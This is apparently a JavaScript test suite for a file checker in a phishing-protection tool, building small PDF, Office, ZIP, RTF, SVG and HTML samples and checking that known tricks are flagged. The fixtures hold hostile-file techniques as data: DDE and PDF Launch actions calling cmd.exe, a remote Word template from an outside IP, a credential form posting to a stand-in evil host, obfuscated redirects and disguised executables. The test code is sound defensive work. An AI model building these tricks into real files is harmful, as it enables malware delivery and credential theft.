/*
 * File checker tests. Each test builds a small file in memory (PDF, ZIP, Office, RTF, web
 * page...) with a known trick in it, and checks that shared/filecheck.js finds it, and that
 * ordinary files stay clean. No real malware is involved.
 */
(function (root, factory) {
  if (typeof module === 'object' && module.exports) module.exports = factory;
  else root.PhishGuardFileCases = factory;
})(typeof globalThis !== 'undefined' ? globalThis : this, function defineFileCases(env) {
  'use strict';
  const { test, assert, PG, lists, qrFixtures } = env;
  const FC = PG.filecheck;
  const deps = { analyzer: PG.analyzer, settings: {}, lists };
  const ids = r => r.findings.map(f => f.id);
  const has = (r, id) => assert.ok(ids(r).includes(id), `expected "${id}", got [${ids(r).join(', ')}] (${r.type.id})`);
  const hasNot = (r, id) => assert.ok(!ids(r).includes(id), `did not expect "${id}"`);
  const check = (name, bytes) => FC.inspect({ name, bytes }, deps);

  const bytesOf = s => Uint8Array.from(s, c => c.charCodeAt(0) & 255);
  const utf8 = s => new TextEncoder().encode(s);
  const concat = (...parts) => {
    const arrs = parts.map(p => (typeof p === 'string' ? bytesOf(p) : p));
    const out = new Uint8Array(arrs.reduce((s, a) => s + a.length, 0));
    let o = 0;
    for (const a of arrs) { out.set(a, o); o += a.length; }
    return out;
  };
  async function deflate(data, format) {
    const s = new Blob([data]).stream().pipeThrough(new CompressionStream(format || 'deflate'));
    return new Uint8Array(await new Response(s).arrayBuffer());
  }

  // A minimal ZIP writer (entries stored or deflated; CRCs aren't checked by the reader).
  async function zip(files) {
    const le = (n, size) => { const a = new Uint8Array(size); for (let i = 0; i < size; i++) a[i] = Math.floor(n / 2 ** (8 * i)) & 255; return a; };
    const parts = [], central = [];
    let offset = 0;
    for (const f of files) {
      const name = utf8(f.name);
      const raw = typeof f.data === 'string' ? utf8(f.data) : f.data;
      const data = f.deflate ? await deflate(raw, 'deflate-raw') : raw;
      const flags = 0x800 | (f.encrypted ? 1 : 0), method = f.deflate ? 8 : 0;
      const local = concat(le(0x04034b50, 4), le(20, 2), le(flags, 2), le(method, 2), le(0, 4), le(0, 4), le(data.length, 4), le(raw.length, 4), le(name.length, 2), le(0, 2), name, data);
      central.push(concat(le(0x02014b50, 4), le(20, 2), le(20, 2), le(flags, 2), le(method, 2), le(0, 4), le(0, 4), le(data.length, 4), le(raw.length, 4),
        le(name.length, 2), le(0, 2), le(0, 2), le(0, 2), le(0, 2), le(0, 4), le(offset, 4), name));
      parts.push(local);
      offset += local.length;
    }
    const cd = concat(...central);
    return concat(...parts, cd, le(0x06054b50, 4), le(0, 2), le(0, 2), le(files.length, 2), le(files.length, 2), le(cd.length, 4), le(offset, 4), le(0, 2));
  }

  // A small PDF: objects are strings, or { dict, data } for streams.
  function pdf(objects) {
    const parts = ['%PDF-1.7\n%\xe2\xe3\xcf\xd3\n'];
    objects.forEach((o, i) => {
      if (typeof o === 'string') parts.push(`${i + 1} 0 obj\n${o}\nendobj\n`);
      else parts.push(`${i + 1} 0 obj\n<< ${o.dict} /Length ${o.data.length} >>\nstream\n`, o.data, '\nendstream\nendobj\n');
    });
    parts.push('trailer\n<< /Root 1 0 R >>\n%%EOF\n');
    return concat(...parts);
  }
  const page = (content, extra) => [
    '<< /Type /Catalog /Pages 2 0 R ' + (extra || '') + '>>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Annots [5 0 R] >>',
    { dict: '', data: bytesOf(content) }
  ];

  // ---------- disguises ----------
  test('Files: a "PDF" that is really a Windows program is dangerous', async () => {
    const r = await check('invoice.pdf', concat('MZ\x90\x00\x03\x00\x00\x00', new Uint8Array(200)));
    assert.equal(r.type.id, 'exe');
    has(r, 'disguised_program');
    assert.equal(r.verdict, 'danger');
  });

  test('Files: double extensions, shortcuts and scripts are dangerous', async () => {
    has(await check('invoice.pdf.exe', concat('MZ', new Uint8Array(100))), 'name_double_ext');
    const lnk = await check('Scan_0042.pdf.lnk', concat(new Uint8Array([0x4c, 0, 0, 0, 1, 0x14, 2, 0]), new Uint8Array(100)));
    assert.equal(lnk.verdict, 'danger');
    const js = await check('payment.js', utf8('var s = new ActiveXObject("WScript.Shell"); s.Run("calc");'));
    has(js, 'script');
    const rtlo = await check('report\u202Efdp.exe', concat('MZ', new Uint8Array(64)));
    has(rtlo, 'name_rtlo');
  });

  test('Files: a web page named .pdf is flagged', async () => {
    const r = await check('statement.pdf', utf8('<!doctype html><html><body><form action="https://evil.example.top/c"><input type="password"></form></body></html>'));
    has(r, 'disguised_html');
    has(r, 'html_password');
    assert.equal(r.verdict, 'danger');
  });

  // ---------- PDF ----------
  test('Files: PDF that runs JavaScript when opened', async () => {
    const r = await check('doc.pdf', pdf(page('BT /F1 12 Tf (Hello) Tj ET', '/OpenAction 6 0 R ').concat(['<< /Type /Annot >>', '<< /S /JavaScript /JS (app.alert\\(1\\)) >>'])));
    has(r, 'pdf_autorun_js');
    assert.equal(r.verdict, 'danger');
  });

  test('Files: PDF keywords hidden with #hex escapes or inside compressed object streams', async () => {
    const r = await check('a.pdf', pdf(page('BT (Hi) Tj ET').concat(['<< /Type /Annot >>', '<< /S /J#61vaScript /J#53 (x) >>'])));
    has(r, 'pdf_obfuscated');
    const hidden = await deflate(bytesOf('7 0 << /S /JavaScript /JS (this.exportDataObject\\({cName: "a.exe", nLaunch: 2}\\)) >> 8 0 << /Type /Action /S /Launch /F (cmd.exe) >>'));
    const r2 = await check('b.pdf', pdf(page('BT (Hi) Tj ET', '/OpenAction 7 0 R ').concat(['<< /Type /Annot >>', { dict: '/Type /ObjStm /N 2 /First 0 /Filter /FlateDecode', data: hidden }])));
    has(r2, 'pdf_autorun_js');
    has(r2, 'pdf_launch');
  });

  test('Files: "click to view the document" PDF with a look-alike link', async () => {
    const r = await check('Secure_Document.pdf', pdf([
      '<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
      '<< /Type /Page /Parent 2 0 R /Contents 4 0 R /Annots [5 0 R] >>',
      { dict: '', data: bytesOf('BT /F1 18 Tf (You have received a secure document.) Tj 0 -30 Td [(Click here) -250 (to view the document)] TJ ET') },
      '<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://micros0ft-online.docs-share.top/view?id=42) >> >>'
    ]));
    has(r, 'pdf_lure');
    has(r, 'link_danger');
    assert.ok(r.links.some(l => l.domain === 'micros0ft-online.docs-share.top' && l.risk === 'danger'));
    assert.equal(r.verdict, 'danger');
  });

  test('Files: an ordinary PDF stays clean', async () => {
    const lines = Array.from({ length: 30 }, (_, i) => `(Line ${i} of the quarterly shop schedule for bay ${i % 4}.) Tj 0 -14 Td`).join(' ');
    const r = await check('schedule.pdf', pdf([
      '<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
      '<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>', { dict: '', data: bytesOf('BT /F1 11 Tf ' + lines + ' ET') }
    ]));
    assert.equal(r.verdict, 'ok', JSON.stringify(r.findings));
  });

  test('Files: PDF with an attached program inside', async () => {
    const exe = concat('MZ\x90\x00', new Uint8Array(300));
    const r = await check('order.pdf', pdf(page('BT (See attached) Tj ET').concat([
      '<< /Type /Annot >>',
      '<< /Type /Filespec /F (update.exe) /UF (update.exe) /EF << /F 7 0 R >> >>',
      { dict: '/Type /EmbeddedFile /Filter /FlateDecode', data: await deflate(exe) }
    ])));
    has(r, 'pdf_embedded');
    assert.ok(r.findings.some(f => f.id.startsWith('inner_') && f.severity === 'high'), JSON.stringify(r.findings));
    assert.equal(r.verdict, 'danger');
  });

  test('Files: QR code picture inside a PDF can be read', async () => {
    const fx = qrFixtures.find(f => f.version === 3 && f.error === 'M');
    const scale = 3, quiet = 4, n = fx.rows.length, w = (n + 2 * quiet) * scale, rowLen = Math.ceil(w / 8);
    const raw = new Uint8Array(rowLen * w);
    for (let y = 0; y < w; y++) for (let x = 0; x < w; x++) {
      const mx = Math.floor(x / scale) - quiet, my = Math.floor(y / scale) - quiet;
      const dark = mx >= 0 && my >= 0 && mx < n && my < n && fx.rows[my][mx] === '1';
      if (!dark) raw[y * rowLen + (x >> 3)] |= 0x80 >> (x & 7); // 1 = white in DeviceGray
    }
    const r = await check('flyer.pdf', pdf(page('BT (Scan to pay) Tj ET').concat(['<< /Type /Annot >>',
      { dict: `/Type /XObject /Subtype /Image /Width ${w} /Height ${w} /ColorSpace /DeviceGray /BitsPerComponent 1 /Filter /FlateDecode`, data: await deflate(raw) }])));
    const img = r.images.find(i => i.pixels);
    assert.ok(img, 'image extracted');
    const qr = PG.qr.decode(img.pixels);
    assert.equal(qr && qr.text, fx.text);
  });

  // ---------- Office ----------
  test('Files: Word document with macros and an "Enable Content" lure', async () => {
    const r = await check('Invoice_8812.docx', await zip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'word/document.xml', data: '<w:document><w:body><w:p><w:r><w:t>This document is protected. Click Enable Content to view.</w:t></w:r></w:p></w:body></w:document>', deflate: true },
      { name: 'word/vbaProject.bin', data: new Uint8Array(64) }
    ]));
    assert.equal(r.type.id, 'docx');
    has(r, 'office_macros');
    has(r, 'office_lure');
    assert.ok(/disguised/.test(r.findings.find(f => f.id === 'office_macros').detail));
  });

  test('Files: Word document that loads a template from the internet, or uses DDE', async () => {
    const r = await check('Contract.docx', await zip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'word/document.xml', data: '<w:document><w:t>Contract</w:t></w:document>' },
      { name: 'word/_rels/settings.xml.rels', data: '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://203.0.113.7/tpl.dotm" TargetMode="External"/></Relationships>', deflate: true }
    ]));
    has(r, 'office_remote');
    const dde = await check('Sheet.docx', await zip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'word/document.xml', data: '<w:document><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText></w:r></w:document>' }
    ]));
    has(dde, 'office_dde');
  });

  test('Files: an ordinary Word document stays clean', async () => {
    const r = await check('Minutes.docx', await zip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'word/document.xml', data: '<w:document><w:body><w:p><w:t>Safety meeting minutes. Next inspection is Thursday.</w:t></w:p></w:body></w:document>', deflate: true },
      { name: 'word/_rels/document.xml.rels', data: '<Relationships><Relationship Id="rId9" Type=".../hyperlink" Target="https://www.osha.gov/" TargetMode="External"/></Relationships>' }
    ]));
    assert.equal(r.verdict, 'ok', JSON.stringify(r.findings));
    assert.ok(r.links.some(l => l.domain === 'www.osha.gov'));
  });

  test('Files: older Office files with macros, packaged objects or encryption', async () => {
    const ole = (...names) => concat(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), new Uint8Array(504),
      ...names.map(n => concat(Uint8Array.from(Array.from(n).flatMap(c => [c.charCodeAt(0), 0])), new Uint8Array([0, 0]), new Uint8Array(40))));
    has(await check('Budget.xls', ole('Root Entry', 'Workbook', '_VBA_PROJECT_CUR', 'VBA')), 'office_macros');
    has(await check('Memo.doc', ole('Root Entry', 'WordDocument', '\x01Ole10Native')), 'office_package');
    has(await check('Payroll.docx', ole('Root Entry', 'EncryptionInfo', 'EncryptedPackage')), 'office_encrypted');
    // Text that merely mentions "VBA" (no directory entry) is not a macro.
    const plain = concat(ole('Root Entry', 'WordDocument'), Uint8Array.from(Array.from('Learn VBA basics').flatMap(c => [c.charCodeAt(0), 0])));
    hasNot(await check('Training.doc', plain), 'office_macros');
  });

  // ---------- archives ----------
  test('Files: archive hiding a disguised script, and a password-protected archive', async () => {
    const r = await check('documents.zip', await zip([{ name: 'readme.txt', data: 'hello' }, { name: 'Invoice.pdf.js', data: 'WScript.Echo(1)' }]));
    has(r, 'archive_disguised');
    assert.equal(r.verdict, 'danger');
    const locked = await check('scan.zip', await zip([{ name: 'scan.pdf', data: 'xxxx', encrypted: true }]));
    has(locked, 'archive_encrypted');
  });

  test('Files: a dangerous PDF inside an archive is found', async () => {
    const inner = pdf(page('BT (x) Tj ET', '/OpenAction 6 0 R ').concat(['<< /Type /Annot >>', '<< /S /JavaScript /JS (x) >>']));
    const r = await check('files.zip', await zip([{ name: 'statement.pdf', data: inner, deflate: true }]));
    assert.ok(ids(r).includes('inner_pdf_autorun_js'), ids(r).join(', '));
    assert.equal(r.verdict, 'danger');
  });

  // ---------- other formats ----------
  test('Files: RTF with an embedded object, SVG with code, HTML redirects', async () => {
    has(await check('order.rtf', utf8('{\\rtf1{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata 0105000002000000}}}')), 'rtf_object');
    has(await check('logo.svg', utf8('<svg xmlns="http://www.w3.org/2000/svg" onload="location=\'https://x.example.top\'"><rect/></svg>')), 'svg_script');
    const h = await check('voicemail.html', utf8('<html><script>var u=atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGU="); window.location.href=u;</script></html>'));
    has(h, 'html_obfuscated');
    has(h, 'html_redirect');
    has(h, 'html_attachment');
  });

  test('Files: plain text and pictures are not flagged', async () => {
    const t = await check('notes.txt', utf8('Bring the torque wrench to bay 3.'));
    assert.equal(t.verdict, 'ok');
    const png = await check('photo.png', new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0]));
    assert.equal(png.type.id, 'png');
    assert.equal(png.verdict, 'ok');
    assert.equal(png.images.length, 1);
  });
});
